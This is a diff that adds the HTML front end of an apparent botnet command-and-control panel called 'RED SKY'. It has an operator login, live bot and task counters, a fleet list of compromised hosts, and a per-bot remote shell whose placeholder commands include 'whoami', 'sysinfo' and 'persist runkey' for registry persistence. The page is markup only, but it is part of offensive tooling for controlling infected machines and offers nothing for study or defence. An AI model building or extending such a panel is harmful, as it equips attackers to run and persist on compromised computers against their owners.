@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RED SKY // panel</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+
+<!-- ── LOGIN ── -->
+<div id="login-screen" class="screen active">
+  <div class="login-card">
+<pre class="banner-small">
+██▀███  ▓█████ ▓█████▄      ██████  ██ ▄█▀▓██   ██▓
+▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▒██    ▒  ██▄█▒  ▒██  ██▒
+▓██ ░▄█ ▒▒███   ░██   █▌   ░ ▓██▄   ▓███▄░   ▒██ ██░
+▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌     ▒   ██▒▓██ █▄   ░ ▐██▓░
+░██▓ ▒██▒░▒████▒░▒████▓    ▒██████▒▒▒██▒ █▄  ░ ██▒▓░
+</pre>
+    <h2>operator login</h2>
+    <input type="password" id="login-pass" placeholder="password" autocomplete="current-password">
+    <input type="text" id="login-totp" placeholder="TOTP code (if enabled)" maxlength="6" inputmode="numeric">
+    <button id="login-btn">enter</button>
+    <div id="login-error" class="error"></div>
+  </div>
+</div>
+
+<!-- ── PANEL ── -->
+<div id="panel-screen" class="screen">
+
+  <header class="topbar">
+    <div class="brand">
+      <span class="brand-glyph">▓</span>
+      <span class="brand-name">RED SKY</span>
+      <span class="brand-tag">// panel</span>
+    </div>
+    <div class="stats" id="topstats">
+      <span class="stat"><span class="stat-label">bots</span> <span class="stat-val" id="stat-bots">0</span></span>
+      <span class="stat"><span class="stat-label">queued</span> <span class="stat-val" id="stat-queued">0</span></span>
+      <span class="stat"><span class="stat-label">done</span> <span class="stat-val" id="stat-done">0</span></span>
+      <span class="stat live"><span class="live-dot"></span> live</span>
+    </div>
+    <button id="logout-btn" class="ghost">logout</button>
+  </header>
+
+  <main class="layout">
+
+    <!-- fleet -->
+    <section class="fleet">
+      <div class="section-head">
+        <h3>fleet</h3>
+        <button id="refresh-btn" class="ghost small">refresh</button>
+      </div>
+      <div id="bot-list" class="bot-list"></div>
+    </section>
+
+    <!-- detail -->
+    <section class="detail">
+      <div id="detail-empty" class="detail-empty">
+        <p>select a bot from the fleet</p>
+      </div>
+
+      <div id="detail-content" class="detail-content hidden">
+        <div class="section-head">
+          <h3 id="detail-hostname">—</h3>
+          <button id="detail-close" class="ghost small">close</button>
+        </div>
+        <div id="detail-meta" class="detail-meta"></div>
+
+        <div class="tabs">
+          <button class="tab active" data-tab="shell">shell</button>
+          <button class="tab" data-tab="tasks">tasks</button>
+          <button class="tab" data-tab="events">events</button>
+        </div>
+
+        <!-- shell -->
+        <div id="tab-shell" class="tab-panel active">
+          <div class="cmd-row">
+            <input type="text" id="cmd-input" placeholder="whoami  |  list_procs  |  sysinfo  |  persist runkey">
+            <button id="cmd-run">run</button>
+          </div>
+          <div id="cmd-output" class="cmd-output"></div>
+        </div>
+
+        <!-- tasks -->
+        <div id="tab-tasks" class="tab-panel">
+          <div id="task-list" class="task-list"></div>
+        </div>
+
+        <!-- events -->
+        <div id="tab-events" class="tab-panel">
+          <div id="event-list" class="event-list"></div>
+        </div>
+
+      </div>
+    </section>
+  </main>
+
+</div>
+
+<script src="/static/panel.js"></script>
+</body>
+</html>
